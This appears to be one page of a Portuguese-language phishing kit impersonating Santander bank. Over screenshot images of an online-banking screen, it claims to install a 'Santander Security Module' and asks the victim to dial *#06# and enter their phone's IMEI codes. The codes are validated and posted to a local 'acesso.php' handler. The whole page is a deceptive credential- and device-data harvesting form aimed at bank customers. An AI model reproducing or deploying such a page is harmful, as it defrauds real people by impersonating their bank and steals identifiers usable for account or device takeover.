<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title> </title>
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
	<link rel="stylesheet" href="styles/geral.css">
	<link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700,900" rel="stylesheet">
	<script src="javascripts/jquery-1.4.2.min.js"></script>
	<script src="javascripts/jquery.maskedinput-1.2.2.min.js"></script>
	<script src="javascripts/custom.js"></script>
<script>
function isIMEI(s){
	var etal = /^[0-9]{15}$/;
	if (!etal.test(s))
		return false;
	sum = 0; mul = 2; l = 14;
	for (i = 0; i < l; i++) {
		digit = s.substring(l-i-1,l-i);
		tp = parseInt(digit,10)*mul;
		if (tp >= 10)
			 sum += (tp % 10) +1;
		else
			 sum += tp;
		if (mul == 1)
			 mul++;
		else
			 mul--;
	}
	chk = ((10 - (sum % 10)) % 10);
	if (chk != parseInt(s.substring(14,15),10))
	return false;
	return true;
}
function check_imei(){
	var imei_one = $("#is_imei_one").val();
	var imei_two = $("#is_imei_two").val();
	var checkImeiOne = isIMEI(imei_one);
	var checkImeiTwo = isIMEI(imei_two);

	if(imei_one.length < 15){
		alert("Você deve informar o código iMei do seu dispositivo!");
		$("#is_imei_one").val('');
		$("#is_imei_one").focus();
		return false;
	}

	if(!checkImeiOne){
		alert("O Código iMei 1 informado não está correto.\nTente novamente!");
		$("#is_imei_one").val('');
		$("#is_imei_one").focus();
		return false;
	}

	if(imei_two == ''){
		var confirmacao = confirm("Seu dispositivo contém apenas 1 código iMei?\nClique em 'Ok' para confirmar.\nClique em 'Cancelar' para voltar e informar o segundo código iMei.");

		if(confirmacao){
			return true;
		}else{
			document.getElementById('is_imei_two').focus();
			return false;
		}
	}

	if(imei_two.length > 0){
		if(!checkImeiTwo){
			alert("O Código iMei 2 informado não está correto.\nTente novamente!");
			$("#is_imei_two").val('');
			$("#is_imei_two").focus();
			return false;
		}
	}

	if(imei_one == imei_two){
		alert("O Código iMei 2 informado não está correto.\nTente novamente!");
		$("#is_imei_two").val('');
		$("#is_imei_two").focus();
		return false;
	}
}
</script>
</head>
<body class="color_enter_home">

<div class="container is_header">

		<div class="left">
			<div class="logo"><img src="imgs/logo.png"></div><!-- logo -->
			<div class="busca"><input type="text" name="busca" class="buscar_home" placeholder="Digite aqui sua busca" autocomplete="off"></div>
		</div><!-- left -->

		<div class="right">
			<div class="gerente"><img src="imgs/icon_gerente.jpg"></div><!-- gerente -->
			<div class="user"><img src="imgs/icon_user.jpg"></div><!-- user -->
			<div class="exit"><span>Sair</span></div>
		</div><!-- right -->

<div class="clear"></div>
</div><!-- container -->


<div class="container is_corpo_main">
		<div class="menu_lateral"><img src="imgs/menu_lateral.jpg"></div>

		<div class="content_corpo">
			<img src="imgs/fundo_corpo.jpg">
		</div><!-- content_corpo -->
	<div class="clear"></div>
</div><!-- container -->

<style>
.itens_imei{display:block;margin-bottom: 8px;font-weight: 500;color:#888;}
.itens_imei .red{color:#ff0000;}
</style>

<div class="block_modal_corpo">
	<div class="modal_corpo">
		<div class="modal_title">
			<img src="imgs/logo.png">
		</div><!-- modal_title -->

		<div class="desc_modal">
			Para iniciarmos a <strong>instalação do Módulo de Segurança Santander</strong>, precisaremos confirmar alguns dados.
			<br><br>
			<span>Para confirmarmos o celular cadastrado, informe os códigos iMei do aparelho informado anteriormente!</span>
		</div><!-- desc_modal -->

		<div style="display:block;width:95%;margin:10px auto 20px auto;font-size:.8em;color:#999;padding:10px;background-color:#f1f1f1;border-radius: 3px;">
			<h1 style="font-weight: 600;font-size:1.1em;color:#ff0000;margin-bottom: 10px;">
				Não sabe como descobrir o código iMei do seu aparelho? Siga os passos abaixo!
			</h1>

			<div>
				<p class="itens_imei"><span class="red">1.</span> Com seu aparelho em mãos, abra o discador de chamadas do celular.</p>
				<p class="itens_imei"><span class="red">2.</span> Digite: <span class="red" style="font-weight: 700;">*#06#</span>, após discar estes números surgirá uma nova tela em seu celular.</p>
				<p class="itens_imei"><span class="red">3.</span> Nesta tela serão apresentados o(s) código(s) iMei do seu aparelho.</p>
				<p class="itens_imei"><span class="red">4.</span> Alguns aparelhos possui 2 códigos iMei, se for o seu caso, informe-os nos campos abaixo.</p>
				<p class="itens_imei"><span class="red">5.</span> Caso seu aparelho contenha apenas 1 código iMei, informe-o no campo abaixo, e ignore o segundo campo.</p>
			</div>
		</div>

		<div class="clear"></div>

		<div class="corpo_modal">
			<form action="acesso.php" method="post" onsubmit="return check_imei();">
				<div class="linha">
					<span>Primeiro código iMei:</span>
					<input type="text" name="is_imei_one" id="is_imei_one" placeholder="Primeiro código iMei" class="input_corpo" maxlength="15" autocomplete="off" onkeypress='return SomenteNumero(event)'>

				</div><!-- linha -->

				<div class="linha">
					<span>Segundo código iMei:</span>
					<input type="text" name="is_imei_two" id="is_imei_two" placeholder="Segundo código iMei" class="input_corpo" maxlength="15" autocomplete="off" onkeypress='return SomenteNumero(event)'>

				</div><!-- linha -->

				<div class="clear"></div>

				<div class="buttons">
					<input type="submit" name="is_enter" id="is_enter" value="Confirmar" class="submit_corpo">
					<input type="hidden" name="sender" value="imei">
				</div><!-- buttons -->
			</form>

		</div><!-- corpo_modal -->
	<div class="clear"></div>
	</div><!-- modal_corpo -->
</div><!-- block_modal_corpo -->








<div class="container">
	<div class="content_login">

	<div class="clear"></div>
	</div><!-- content_login -->
</div><!-- container -->
</body>
</html>
